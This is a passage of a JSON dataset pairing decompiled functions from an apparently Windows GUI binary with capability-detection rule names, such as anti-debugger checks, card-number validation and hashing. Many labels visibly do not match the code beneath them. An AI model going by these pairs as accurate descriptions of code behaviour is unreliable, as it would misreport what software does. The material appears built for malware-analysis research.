        "decompiled_code": "\nint32_t __cdecl fcn.0041ef0d(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h_00;\n    int32_t iVar4;\n    uint16_t *puVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.0043026e();\n    uVar1 = *(iVar2 + 0xc);\n    iVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar1, arg_8h, 0xf1);\n    if (((iVar2 != 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar1, iVar2),  iVar2 != 0)) &&\n       (iVar3 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar2),  iVar3 != 0)) {\n        arg_8h_00 = fcn.00411579(*(iVar3 + 6) * 4);\n        iVar4 = 0;\n        if (*(iVar3 + 6) != 0) {\n            puVar5 = iVar3 + 8;\n            do {\n                *(arg_8h_00 + iVar4 * 4) = *puVar5;\n                iVar4 = iVar4 + 1;\n                puVar5 = puVar5 + 1;\n            } while (iVar4 < *(iVar3 + 6));\n        }\n        iVar4 = fcn.0041da80(arg_8h_00, *(iVar3 + 6));\n        fcn.004115a4(arg_8h_00);\n        if (iVar4 != 0) {\n            fcn.0041e288(*(iVar3 + 2) + 7, *(iVar3 + 4) + 7, *(iVar3 + 2), *(iVar3 + 4));\n            iVar4 = fcn.0041e3a4(arg_8h);\n        }\n        (*_sym.imp.KERNEL32.dll_FreeResource)(iVar2);\n        return iVar4;\n    }\n    return 0;\n}\n",
        "token_count": 467
    },
    "0044935f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044935f(int32_t arg_8h, uint *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_24h;\n    int32_t var_20h;\n    uint32_t var_18h;\n    uint var_10h;\n    uint32_t lpPoint;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    puVar3 = arg_ch;\n    puVar4 = &var_24h;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    var_24h = (*_sym.imp.USER32.dll_SendMessageA)(*(arg_8h + 0x20), 0x410, 0, &var_10h);\n    lpPoint = arg_ch[5];\n    var_4h = arg_ch[6];\n    if (var_20h - 0x200U < 10) {\n        (*_sym.imp.USER32.dll_ScreenToClient)(var_24h, &lpPoint);\n    }\n    var_18h = lpPoint & 0xffff | var_4h << 0x10;\n    (*pcVar1)(*(arg_8h + 0x20), 0x407, 0, &var_24h);\n    return;\n}\n",
        "token_count": 360
    },
    "0045c582": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c582(uint arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint32_t var_4h;\n    \n    if ((arg_10h & 0x4000) != 0) {\n        arg_10h = arg_10h & 0xffffbfff | 0x40;\n    }\n    if (arg_10h == 8) {\n        arg_10h = 0xe;\n    }\n    var_4h = arg_10h & 0xff;\n    fcn.0045bf66(arg_ch, (arg_10h == 9) * 4 + 4, 0, 0, &var_4h, &arg_14h);\n    return;\n}\n",
        "token_count": 177
    },
    "0041dc67": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041dc67(uint arg_8h)\n\n{\n    uint var_18h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    fcn.0041dbbe(arg_8h, &var_18h);\n    fcn.0045e747(arg_8h);\n    return;\n}\n",
        "token_count": 98
    },
    "0041dd88": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041dd88(uint arg_8h, uint *arg_ch, uint32_t *arg_10h, uint *arg_14h)\n\n{\n    uint unaff_ESI;\n    uint var_18h;\n    uint var_14h;\n    uint8_t var_10h;\n    uint var_fh;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    fcn.0041dbbe(arg_8h, &var_18h);\n    *arg_ch = var_14h;\n    *arg_10h = var_10h << 0x10 | var_fh;\n    *arg_14h = var_18h;\n    fcn.0045e747(unaff_ESI);\n    return;\n}\n",
        "token_count": 192
    },
    "004214d5": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004214d5(int32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetKeyState;\n    iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(0x11);\n    if (iVar2 < 0) {\n        uVar3 = 8;\n    }\n    else {\n        uVar3 = 0;\n    }\n    iVar2 = (*pcVar1)(0x10);\n    if (iVar2 < 0) {\n        uVar4 = 4;\n    }\n    else {\n        uVar4 = 0;\n    }\n    iVar5 = (*_sym.imp.USER32.dll_GetFocus)();\n    iVar6 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    if (iVar5 == 0) {\n        iVar7 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x20a, arg_8h << 0x10 | uVar3 | uVar4, arg_ch);\n    }\n    else {\n        do {\n            iVar7 = (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x20a, arg_8h << 0x10 | uVar3 | uVar4, arg_ch);\n            iVar5 = (*_sym.imp.USER32.dll_GetParent)(iVar5);\n            if (iVar7 != 0) {\n                return iVar7;\n            }\n            if (iVar5 == 0) {\n                return 0;\n            }\n        } while (iVar5 != iVar6);\n    }\n    return iVar7;\n}\n",
        "token_count": 419
    },
    "00453039": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00453039(int32_t arg_8h, uint32_t lpPoint, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    while( true ) {\n        (*_sym.imp.USER32.dll_ScreenToClient)(arg_8h, &lpPoint);\n        iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x366, 0, lpPoint & 0xffff | arg_10h << 0x10);\n        (*_sym.imp.USER32.dll_ClientToScreen)(arg_8h, &lpPoint);\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(arg_8h, 0xfffffff0);\n        if (((uVar2 & 0x40000000) == 0) || (arg_8h = (*_sym.imp.USER32.dll_GetParent)(arg_8h),  arg_8h == 0)) break;\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n    }\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    return -1;\n}\n",
        "token_count": 266
    },
    "00427cee": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00427cee(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t lprc;\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = (**(*in_ECX + 0xc))();\n    fcn.00427b70(&var_14h);\n    pcVar1 = _sym.imp.USER32.dll_PtInRect;\n    iVar2 = (*_sym.imp.USER32.dll_PtInRect)(&var_14h, arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        iVar2 = -1;\n    }\n    else {\n        iVar2 = 0;\n        do {\n            if ((var_4h & 1 << (iVar2 & 0x1f)) != 0) {\n                fcn.00427bc2(iVar2, &var_14h);\n                iVar3 = (*pcVar1)(&var_14h, arg_8h, arg_ch);\n                if (iVar3 != 0) {\n                    return iVar2;\n                }\n            }\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < 8);\n        var_4h = in_ECX[1];\n        if ((var_4h & 4) == 0) {\n            lprc = in_ECX[2];\n            iStack36 = in_ECX[3];\n            iStack32 = in_ECX[4];\n            iStack28 = in_ECX[5];\n            fcn.00410ad0();\n            if ((var_4h & 2 | 1) != 0) {\n                (*_sym.imp.USER32.dll_InflateRect)(&lprc, 1, 1);\n            }\n            iVar2 = (*pcVar1)(&lprc, arg_8h, arg_ch);\n            if (iVar2 == 0) {\n                return -1;\n            }\n        }\n        iVar2 = 8;\n    }\n    return iVar2;\n}\n",
        "token_count": 498
    },
    "004384c9": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004384c9(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_ESI;\n    uint arg_10h;\n    uint uStack300;\n    int32_t iStack292;\n    int32_t iStack288;\n    int32_t iStack284;\n    int32_t iStack280;\n    int32_t iStack276;\n    int32_t iStack272;\n    uchar auStack268 [80];\n    uchar auStack188 [180];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4b8030 ^ auStack188;\n    iStack276 = param_2;\n    iStack272 = param_3;\n    if (param_1 != 0) goto code_r0x00438506;\n    do {\n        fcn.00411e42();\ncode_r0x00438506:\n    } while (param_2 == 0);\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(param_2 + 0x20), &stack0xfffffec4);\n    if (*(param_2 + 0x8c) == param_1) {\n        if (iStack272 == 0) goto code_r0x00438737;\n        iVar2 = (*_sym.imp.USER32.dll_EqualRect)(&stack0xfffffec4, iStack272);\n        if (iVar2 != 0) goto code_r0x00438737;\n    }\n    if ((*(param_1 + 0x94) != 0) && ((*(param_2 + 0x84) & 0x40) != 0)) {\n        *(param_1 + 0x80) = *(param_1 + 0x80) | 0x40;\n    }\n    *(param_1 + 0x80) = *(param_1 + 0x80) & 0xfffffff9;\n    uVar3 = *(param_1 + 0x80);\n    *(param_1 + 0x80) = *(param_2 + 0x80) & 6 | uVar3;\n    if ((uVar3 & 0x40) == 0) {\n        fcn.0041c69d(auStack268, 0x104);\n        fcn.0043042c(*(param_1 + 0x20), auStack268);\n    }\n    uVar3 = (*(param_2 + 0x80) ^ *(param_1 + 0x80)) & 0xf000 ^ *(param_2 + 0x80);\n    if (*(param_1 + 0x94) == 0) {\n        uVar3 = uVar3 & 0xfffffffe | 0xf00;\n    }\n    else {\n        uVar3 = uVar3 | 0xf01;\n    }\n    fcn.00433452(uVar3);\n    bVar1 = false;\n    if (*(param_2 + 0x8c) != param_1) {\n        iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(param_2 + 0x20));\n        if (iVar2 != 0) {\n            fcn.0041c2a1(0, 0, 0, 0, 0, 0x97);\n            bVar1 = true;\n        }\n    }\n    uStack300 = 0xffffffff;\n    if (iStack272 == 0) {\n        fcn.0044bd54(*(param_1 + 0xa0), param_2);\n        fcn.0044bd54(*(param_1 + 0xa0), 0);\n        fcn.0041c2a1(0, -*0x4bb5e8, -*0x4bb5ec, 0, 0, 0x115);\n    }\n    else {\n        (*_sym.imp.USER32.dll_CopyRect)(&iStack292, iStack272);\n        fcn.0042dd8a(&iStack292);\n        uStack300 = fcn.004379e0(iStack276, iStack292, iStack288, iStack284, iStack280, \n                                 (iStack284 - iStack292) / 2 + iStack292, (iStack280 - iStack288) / 2 + iStack288);\n        fcn.0041c2a1(0, iStack292, iStack288, iStack284 - iStack292, iStack280 - iStack288, 0x114);\n        param_2 = iStack276;\n    }\n    (*_sym.imp.USER32.dll_GetParent)(*(param_2 + 0x20));\n    iVar2 = fcn.004185c5();\n    if (iVar2 != param_1) {\n        fcn.004377d1(param_1);\n    }\n    iVar2 = *(param_2 + 0x8c);\n    if (iVar2 == param_1) {\n        arg_10h = 0;\ncode_r0x00438702:\n        fcn.00437d9e(param_2, uStack300, arg_10h);\n    }\n    else if (iVar2 != 0) {\n        if ((*(param_1 + 0x94) == 0) || (*(iVar2 + 0x94) != 0)) {\n            arg_10h = 0;\n        }\n        else {\n            arg_10h = 1;\n        }\n        uStack300 = 0xffffffff;\n        goto code_r0x00438702;\n    }\n    *(param_2 + 0x8c) = param_1;\n    if (bVar1) {\n        fcn.0041c2a1(0, 0, 0, 0, 0, 0x57);\n    }\n    fcn.00437d37(param_2);\n    iVar2 = fcn.0041fab8();\n    *(iVar2 + 0xd0) = *(iVar2 + 0xd0) | 0xc;\ncode_r0x00438737:\n    fcn.0045e747(unaff_ESI);\n    return;\n}\n",
        "token_count": 1371
    },
    "00427bc2": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427bc2(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lprc;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lprc = in_ECX[2];\n    var_ch = in_ECX[3];\n    var_8h = in_ECX[4];\n    var_4h = in_ECX[5];\n    fcn.00410ad0();\n    if ((*(in_ECX + 1) & 3) != 0) {\n        (*_sym.imp.USER32.dll_InflateRect)(&lprc, 1, 1);\n    }\n    iVar1 = fcn.00427a40(arg_8h);\n    iVar2 = (**(*in_ECX + 0x14))(0);\n    if ((*(in_ECX + 1) & 0x10) != 0) {\n        (*_sym.imp.USER32.dll_InflateRect)(&lprc, iVar2 + -1, iVar2 + -1);\n    }\n    iVar1 = iVar1 * 0x20;\n    iVar3 = *(&lprc + *(iVar1 + 0x495338)) + *(iVar1 + 0x495348) * iVar2 +\n            (((var_8h - lprc) - iVar2) * *(iVar1 + 0x495340)) / 2;\n    iVar1 = *(&lprc + *(iVar1 + 0x49533c)) + *(iVar1 + 0x49534c) * iVar2 +\n            (((var_4h - var_ch) - iVar2) * *(iVar1 + 0x495344)) / 2;\n    *arg_ch = iVar3;\n    arg_ch[1] = iVar1;\n    arg_ch[2] = iVar3 + iVar2;\n    arg_ch[3] = iVar1 + iVar2;\n    return;\n}\n",
        "token_count": 493
    },
    "00427db5": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427db5(int32_t arg_8h, int32_t **arg_ch, int32_t **arg_10h, int32_t *arg_14h, int32_t *arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t *piVar3;\n    int32_t *extraout_EDX;\n    int32_t iVar4;\n    \n    piVar3 = NULL;\n    if (-1 < arg_8h) goto code_r0x00427dcb;\n    do {\n        fcn.00411e42();\n        piVar3 = extraout_EDX;\ncode_r0x00427dcb:\n    } while (8 < arg_8h);\n    if (arg_8h == 8) {\n        arg_8h = 0;\n    }\n    iVar4 = arg_8h * 0x20;\n    *arg_ch = piVar3;\n    *arg_10h = piVar3;\n    if (*(iVar4 + 0x495350) == arg_8h) {\n        if (arg_14h == piVar3) goto code_r0x00427e20;\n        iVar2 = fcn.00464166(*(in_ECX + 0x10) - *(in_ECX + 8));\n        iVar2 = iVar2 / 2 + *(in_ECX + 8);\n    }\n    else {\n        piVar1 = *(iVar4 + 0x495338) + 8 + in_ECX;\n        *arg_ch = piVar1;\n        if (arg_14h == piVar3) goto code_r0x00427e20;\n        iVar2 = *piVar1;\n    }\n    *arg_14h = iVar2;\ncode_r0x00427e20:\n    if (*(iVar4 + 0x495354) == arg_8h) {\n        if (arg_18h != NULL) {\n            iVar4 = fcn.00464166(*(in_ECX + 0x14) - *(in_ECX + 0xc));\n            *arg_18h = iVar4 / 2 + *(in_ECX + 0xc);\n        }\n    }\n    else {\n        piVar3 = *(iVar4 + 0x49533c) + 8 + in_ECX;\n        *arg_10h = piVar3;\n        if (arg_18h != NULL) {\n            *arg_18h = *piVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 563
    },
    "0042a114": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a114(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint extraout_ECX;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_18h;\n    uint var_11h;\n    uint var_4h;\n    int32_t iVar5;\n    \n    iVar5 = 0x14;\n    fcn.004627e2(0x14);\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    iVar3 = *(unaff_EBP + 0xc);\n    iVar4 = 0;\n    if (iVar3 < 0) {\n        iVar3 = -iVar3;\n    }\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 != 0) {\n        *(unaff_EBP + -4) = 0;\n        for (; *(unaff_EBP + -0x18) = iVar4,  iVar4 < iVar3; iVar4 = iVar4 + 1) {\n            iVar5 = unaff_EBP + -0x11;\n            fcn.00429d55();\n            cVar2 = *(unaff_EBP + -0x11);\n            if (cVar2 == '\\n') {\ncode_r0x0042a16f:\n                if (*(unaff_EBP + 0xc) != iVar3) {\n                    *(iVar4 + iVar1) = cVar2;\n                    iVar4 = iVar4 + 1;\n                }\n                break;\n            }\n            if (cVar2 == '\\r') {\n                iVar5 = unaff_EBP + -0x11;\n                fcn.00429d55();\n                cVar2 = *(unaff_EBP + -0x11);\n                goto code_r0x0042a16f;\n            }\n            *(iVar4 + iVar1) = cVar2;\n        }\n        *(iVar4 + iVar1) = 0;\n    }\n    fcn.00462887(iVar5);\n    return;\n}\n",
        "token_count": 470
    },
    "00439c09": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439c09(int32_t arg_8h, uint arg_ch)\n\n{\n    ushort *in_ECX;\n    \n    if (arg_ch == 10) {\n        *in_ECX = 10;\n    }\n    else {\n        if (arg_ch == 0xb) {\n            *in_ECX = 0xb;\n            in_ECX[4] = -(arg_8h != 0);\n            return;\n        }\n        if (arg_ch == 0x16) {\n            *in_ECX = 0x16;\n        }\n        else if (arg_ch == 0x17) {\n            *in_ECX = 0x17;\n        }\n        else if (arg_ch == 0x19) {\n            *in_ECX = 0x19;\n        }\n        else if (arg_ch == 0x13) {\n            *in_ECX = 0x13;\n        }\n        else {\n            *in_ECX = 3;\n        }\n    }\n    *(in_ECX + 4) = arg_8h;\n    return;\n}\n",
        "token_count": 237
    },
    "0044a1a8": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044a1a8(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint uVar5;\n    uint lprcDst;\n    int32_t lprcSrc1;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t lprcSrc2;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = arg_8h - *(in_ECX + 4);\n    iVar4 = arg_ch - *(in_ECX + 8);\n    iVar3 = *(in_ECX + 0x8c);\n    uVar5 = 2;\n    if (iVar3 == 10) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + iVar2;\n    }\n    else {\n        if (iVar3 != 0xb) {\n            uVar5 = 0x22;\n            if (iVar3 == 0xc) {\n                *(in_ECX + 0x2c) = *(in_ECX + 0x2c) + iVar4;\n            }\n            else {\n                *(in_ECX + 0x34) = *(in_ECX + 0x34) + iVar4;\n            }\n            iVar3 = *(in_ECX + 0x34) - *(in_ECX + 0x2c);\n            goto code_r0x0044a200;\n        }\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + iVar2;\n    }\n    iVar3 = *(in_ECX + 0x30) - *(in_ECX + 0x28);\ncode_r0x0044a200:\n    if (iVar3 < 0) {\n        iVar3 = 0;\n    }\n    (**(**(in_ECX + 0x68) + 0x138))(&var_8h, iVar3, uVar5);\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    lprcSrc1 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x4c);\n    var_24h = (*pcVar1)(0x4d);\n    var_20h = (*pcVar1)(0x4e);\n    var_20h = var_20h + lprcSrc1;\n    var_1ch = (*pcVar1)(0x4f);\n    var_1ch = var_1ch + var_24h;\n    lprcSrc2 = *(in_ECX + 0x48);\n    var_14h = *(in_ECX + 0x4c);\n    var_10h = *(in_ECX + 0x50);\n    var_ch = *(in_ECX + 0x54);\n    if ((*(in_ECX + 0x8c) == 10) || (*(in_ECX + 0x8c) == 0xc)) {\n        lprcSrc2 = ((*(in_ECX + 0x58) - *(in_ECX + 0x60)) - var_8h) + var_10h;\n        var_14h = ((*(in_ECX + 0x5c) - *(in_ECX + 100)) - var_4h) + var_ch;\n        iVar3 = (*_sym.imp.USER32.dll_IntersectRect)(&lprcDst, &lprcSrc1, &lprcSrc2);\n        if (iVar3 != 0) {\n            *(in_ECX + 0x38) = *(in_ECX + 0x40) - var_8h;\n            *(in_ECX + 0x3c) = *(in_ECX + 0x44) - var_4h;\n            *(in_ECX + 0x48) = lprcSrc2;\n            *(in_ECX + 0x4c) = var_14h;\n        }\n    }\n    else {\n        var_10h = (*(in_ECX + 0x60) - *(in_ECX + 0x58)) + lprcSrc2 + var_8h;\n        var_ch = (*(in_ECX + 100) - *(in_ECX + 0x5c)) + var_14h + var_4h;\n        iVar3 = (*_sym.imp.USER32.dll_IntersectRect)(&lprcDst, &lprcSrc1, &lprcSrc2);\n        if (iVar3 != 0) {\n            *(in_ECX + 0x40) = *(in_ECX + 0x38) + var_8h;\n            *(in_ECX + 0x44) = *(in_ECX + 0x3c) + var_4h;\n            *(in_ECX + 0x50) = var_10h;\n            *(in_ECX + 0x54) = var_ch;\n        }\n    }\n    *(in_ECX + 4) = arg_8h;\n    *(in_ECX + 8) = arg_ch;\n    fcn.00449f99(0);\n    return;\n}\n",
        "token_count": 1206
    },
    "004304e4": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.004304e4(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GlobalFlags)(param_1);\n        for (uVar1 = uVar1 & 0xff; uVar1 != 0; uVar1 = uVar1 - 1) {\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(param_1);\n        }\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(param_1);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "0043457e": {
        "rules": [
            "hash data using djb2/6ad21e310d674441ba35d7276afbe57d",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0043457e(uint8_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t extraout_ECX;\n    uint32_t uVar2;\n    ulong uVar3;\n    \n    iVar1 = 0;\n    if (param_1 != NULL) goto code_r0x00434596;\n    uVar3 = fcn.00411e42();\n    uVar2 = extraout_ECX;\n    do {\n        iVar1 = uVar3 * 0x21 + uVar2;\n        param_1 = (uVar3 >> 0x20) + 1;\ncode_r0x00434596:\n        uVar3 = CONCAT44(param_1, iVar1);\n        uVar2 = *param_1;\n    } while (*param_1 != 0);\n    return iVar1;\n}\n",
        "token_count": 187
    },
    "00441e27": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: hRgn\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.00441e27(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint hRgn;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(0xc);\n    iVar3 = *(unaff_EBP + 8);\n    if (iVar3 == 0) {\n        iVar3 = fcn.00411e42();\n    }\n    piVar1 = extraout_ECX + 0x19;\n    (*_sym.imp.USER32.dll_ClientToScreen)(*(iVar3 + 0x20), piVar1);\n    pcVar2 = _sym.imp.USER32.dll_GetSystemMetrics;\n    iVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x25);\n    extraout_ECX[0x16] = extraout_ECX[0x1a] - iVar3;\n    iVar3 = (*pcVar2)(0x25);\n    extraout_ECX[0x18] = iVar3 + extraout_ECX[0x1a];\n    iVar4 = (*pcVar2)(0x24);\n    iVar3 = *piVar1;\n    extraout_ECX[0x15] = *piVar1 - iVar4;\n    iVar4 = (*pcVar2)(0x24);\n    extraout_ECX[0x17] = iVar4 + iVar3;\n    *(unaff_EBP + -0x10) = *extraout_ECX;\n    uVar5 = fcn.0041b694(0x800, 0, 0, 0);\n    iVar3 = (**(*(unaff_EBP + -0x10) + 0x5c))(0x88, uVar5);\n    fcn.0041df3b(*(unaff_EBP + 8));\n    if (iVar3 != 0) {\n        *(unaff_EBP + -0x14) = 0;\n        *(unaff_EBP + -0x18) = vtable.CRgn.0;\n        *(unaff_EBP + -4) = 0;\n        uVar5 = (*_sym.imp.GDI32.dll_CreateEllipticRgn)(0, 0, 0x20, 0x20);\n        fcn.0042e438(uVar5);\n        (*_sym.imp.USER32.dll_SetWindowRgn)(extraout_ECX[8], *(unaff_EBP + -0x14), 1);\n        uVar5 = (*_sym.imp.USER32.dll_SetCapture)(extraout_ECX[8]);\n        fcn.004185c5(uVar5);\n        (*_sym.imp.USER32.dll_SetTimer)(extraout_ECX[8], 0xe000, 0x32, 0);\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(unaff_EBP + -0x18) = vtable.CGdiObject.0;\n        fcn.0042e48b();\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 777
    },
    "00481510": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.00481510(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    uint32_t unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == unaff_EDI) {\n        puVar1 = *((unaff_ESI >> 5) * 4 + 0x4bd320) + 4 + (unaff_ESI & 0x1f) * 0x28;\n        *puVar1 = *puVar1 & 0xfe;\n    }\n    fcn.00481262();\n    return;\n}\n",
        "token_count": 152
    },
    "004883ae": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472",
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004883ae(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint arg_8h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    iVar4 = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetThreadLocale)();\n    arg_8h = 0x1004;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(uVar1, 0x1004, &var_ch, 7);\n    if (iVar2 != 0) {\n        puVar3 = &var_ch;\n        if (var_ch != '\\0') {\n            do {\n                puVar3 = puVar3 + 1;\n                iVar4 = iVar4 * 10 + -0x30 + var_ch;\n                var_ch._0_1_ = *puVar3;\n            } while (var_ch != '\\0');\n            if (iVar4 != 0) goto code_r0x00488404;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_GetACP)();\ncode_r0x00488404:\n    fcn.0045e747(arg_8h);\n    return;\n}\n",
        "token_count": 305
    },
    "00401120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
